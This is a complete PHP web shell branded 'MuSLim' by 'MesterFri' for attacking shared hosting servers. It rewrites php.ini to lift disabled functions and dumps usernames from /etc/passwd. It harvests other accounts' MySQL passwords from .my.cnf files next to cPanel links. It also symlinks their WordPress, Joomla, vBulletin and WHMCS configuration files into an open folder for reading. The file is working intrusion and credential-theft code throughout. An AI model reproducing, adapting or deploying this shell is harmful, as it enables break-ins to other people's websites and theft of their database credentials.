<?php


$head = '
<html>
<head>
</script>
<title>MuSLim - by MesterFri</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma;
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #5B5B5B;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #5B5B5B;
color: #FFF;
}
table {
    border: 5px #5B5B5B solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:50px;
    BACKGROUND-COLOR: Black;
    color: #B0B0B0;
}
input,select{
    border: 5px #5B5B5B solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:50px;
    BACKGROUND-COLOR: Black;
    color: #B0B0B0;
}
textarea {
    border: 5px #5B5B5B solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:20px;
    BACKGROUND-COLOR: Black;
    color: #B0B0B0;
}
submit {
BORDER: buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
BODY {
SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: #B0B0B0;
background-color: #3C3C3C;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: #B0B0B0; TEXT-DECORATION: none
}
A:active {
color: #B0B0B0; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
document.getElementById(id).style.display = \'none\';
document.cookie=id+\'=0;\';
}
function show_div(id)
{
document.getElementById(id).style.display = \'block\';
document.cookie=id+\'=1;\';
}
function change_divst(id)
{
if (document.getElementById(id).style.display == \'none\')
show_div(id);
else
hide_div(id);
}
</script>'; ?>
<html>
<head>
<?php
echo $head ;
?>
<body bgcolor=black>
<p style="text-align:center">
<B>
<big>
<font style="FONT-SIZE: 25px">MUSLIM</font>
</big>
</B>
<br>
<B>
<big>
<font style="FONT-SIZE: 80px">H</font><font style="FONT-SIZE: 60px">A</font><font style="FONT-SIZE: 40px">C</font><font style="FONT-SIZE: 20px">K</font><font style="FONT-SIZE: 40px">E</font><font style="FONT-SIZE: 60px">R</font><font style="FONT-SIZE: 80px">S</font>
</big>
</B>
</p>
<h3 style="text-align:center"><font color="#B0B0B0" size=2 face="comic sans ms">
<form method=post>
<input type=submit name=ini value="Crack PHP.ini" /></form>
<?php
if(isset($_POST['ini']))
{

$r=fopen('php.ini','w');
$rr=" disable_functions=none ";
fwrite($r,$rr);
$link="<a href=php.ini><font color=#B0B0B0 size=2 face=\"comic sans ms\"><u>Click Here..!</u></font></a>";
echo $link;

}
?>
<?php
?>
<form method=post>
<input type=submit name="usre" value="Crack User" /></form>




<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=20 cols=60 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=su value="Exploit" /></form>
<?php } ?>

<form method=post>
<input type=submit name=auto value="Crack cPanel" /></form>
<?php
if(isset($_POST['auto']))
{



@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
 


echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
 
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
 
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}
 
}
}
echo '</table>';
$total = $dc;
echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th><font color='#F0F0F0'> COUNT </font></th><th><font color='#F0F0F0'> DOMAIN </font></th><th><font color='#F0F0F0'> USER </font></th><th><font color='#F0F0F0'> Password </font></th><th><font color='#F0F0F0'> .my.cnf </font></th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $cp = explode(':',$d);
    if(strpos($cp[5],'home')) {
        $passwd[$cp[0]] = $cp[5];
    }
}
$l=0;
$j=1;
foreach($usr as $cp) {
$dirz = '/home/'.$cp.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$cp.'.txt');
$p=file_get_contents(''.$path.'/'.$cp.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$cp."</td><td>".$password."</td><td><a href='".$cp.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                                }
            }
                        }
echo '</table>';
$total = $dc;
echo '<br><div class="result"><font color="#F0F0F0">Total cPanel Found =</font> '.$total.'</h3><br />';
echo '</center>';
 
}
}else{
echo "<div class='result'><i><font color='#FFF'>Auto Crack cPanel Error</font></i></div>";
}



}
?>

<br>
<br>
<p align="center">
<div style="font-family: 'Times New Roman';font-size: 35pt;text-shadow: 0 0 5px #B0B0B0, 0 0 5px #B0B0B0, 0 0 5px #B0B0B0;color: #000">
<center><font size="+4">M</font><font  size="+2">ester</font><font  size="+4">F</font><font size="+2">ri</font>
<br/></div><br/>
</p>
<br>
<?php
error_reporting(0);
echo "<font color=#B0B0B0 size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{

$dir=mkdir('Fri',0777);
$r = " Options all \n DirectoryIndex MuSLim.html \n Require None \n Satisfy Any";
$f = fopen('Fri/.htaccess','w');

fwrite($f,$r);
$consym="<a href=Fri/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>folder where config files has been symlinked<br><u><font color=#B0B0B0 size=2 face=\"comic sans ms\">$consym</font></u>";

$usr=explode("\n",$_POST['user']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="Fri/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
?>
